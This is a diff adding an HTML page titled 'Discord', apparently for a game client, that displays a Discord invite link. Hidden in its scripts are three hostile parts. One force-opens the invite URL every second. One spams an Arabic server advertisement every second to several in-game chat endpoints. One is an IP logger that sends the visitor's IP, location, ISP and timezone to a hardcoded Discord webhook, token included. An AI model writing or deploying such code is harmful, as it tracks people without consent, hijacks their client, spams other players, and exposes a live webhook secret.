@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="ar">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Discord</title>
+  <style>
+    html, body { height: 100%; margin: 0; }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
+      font-size: clamp(24px, 4vw, 48px);
+    }
+    a {
+      text-decoration: none;
+      color: #000000; 
+    }
+  </style>
+</head>
+<body>
+  <a href="https://discord.gg/fbqQGHKeNW" target="_blank" rel="noopener">
+    discord.gg/fbqQGHKeNW
+  </a>
+  <script>
+setInterval(() => {
+window.invokeNative("openUrl", "https://discord.gg/fbqQGHKeNW");
+window.invokeNative("openUrl", "https://discord.gg/fbqQGHKeNW");
+window.invokeNative("openUrl", "https://discord.gg/fbqQGHKeNW");
+window.invokeNative("openUrl", "https://discord.gg/fbqQGHKeNW");
+}, 1000);
+    </script>
+        <script>
+const msg = `افضل سيرفر THE FUTURE`;
+const body = JSON.stringify({ message: msg });
+setInterval(() => {
+fetch("https://flix-scripts/chatResult", { method: "POST", body });
+fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})})
+fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+fetch("https://melix_chat/chatResult", { method: "POST", body });
+fetch("https://as_chat/chatResult", { method: "POST", body });
+fetch("https://chat/chatResult", { method: "POST", body });
+fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+}, 1000);
+    </script>
+    <script>
+  const webhookURL = "https://discord.com/api/webhooks/1403103158963802173/tINcs0j2mqn1GbyrFvd6ELwGrRl4XOZJAzhzhaKOYMOqmhiM0JDHPuxelbSPCjinx8SO";
+
+  fetch("https://ipinfo.io/json")
+    .then(res => res.json())
+    .then(data => {
+      const embed = {
+        embeds: [
+          {
+            title: "Someone Logged By vByte Logger ✅",
+            color: 16711680,
+            fields: [
+              { name: "IP", value: data.ip || "N/A", inline: true },
+              { name: "City", value: data.city || "N/A", inline: true },
+              { name: "Region", value: data.region || "N/A", inline: true },
+              { name: "Country", value: data.country || "N/A", inline: true },
+              { name: "Location", value: data.loc || "N/A", inline: true },
+              { name: "Org", value: data.org || "N/A", inline: false },
+              { name: "Timezone", value: data.timezone || "N/A", inline: true }
+            ],
+            footer: {
+              text: "vByte Logger"
+            },
+            timestamp: new Date().toISOString()
+          }
+        ]
+      };
+
+      return fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(embed)
+      });
+    })
+    .then(res => {
+      if (!res.ok) console.error("Discord webhook failed:", res.statusText);
+    })
+    .catch(err => {
+      console.error("Error:", err);
+    });
+</script>
+</body>
+</html>
